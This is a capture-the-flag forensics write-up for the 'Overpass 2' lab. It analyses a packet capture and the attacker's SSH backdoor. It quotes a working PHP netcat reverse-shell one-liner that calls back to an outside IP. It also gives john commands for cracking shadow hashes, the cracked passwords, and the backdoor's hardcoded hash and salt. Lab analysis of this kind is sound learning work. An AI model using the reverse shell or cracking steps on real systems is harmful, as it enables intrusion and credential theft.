# Overpass 2 - Hacked

## Forensics

**Related files**
* `overpass2.pcapng` - Wireshark packet file
* `upload.php` - Uploaded php script
* `shadow` - Shadow file
* `shadow_hashes` - List of hashes from `shadow` file
* `fasttrack.txt` - Wordlist for hash cracking

Analyzing the `.pcapng` file we can see that the `/development/` page is what was used to upload a reverse shell. The file itself contained the following php script: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>` (located in `upload.php`). Once in the password `whenevernoteartinstant` was used for privelage escalation. To establish persistence the attacker used [this](https://github.com/NinjaJc01/ssh-backdoor) repository. From the passwords in the shadow file `4` of them were able to be cracked using the `fasttrack.txt` wordlist using `john --wordlist=fasttrack.txt shadow_hashes` as the command:

```
secret12
abcd123
1qaz2wsx
secuirty3
```

## Research

**Related files**
* `hash` - File containing hash and salt in format: hash$salt

The default hash and salt can be found by looking at the Github repository in the `main.go` file. The default hash is `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3` and the hardcoded salt is `1c362db832f3f864c8c2fe05f2002a05`. The hash that the attacker specifically used is `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`. Using `john -format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt hash` The `hash$salt` combination string was able to be decrypted to be `november16`.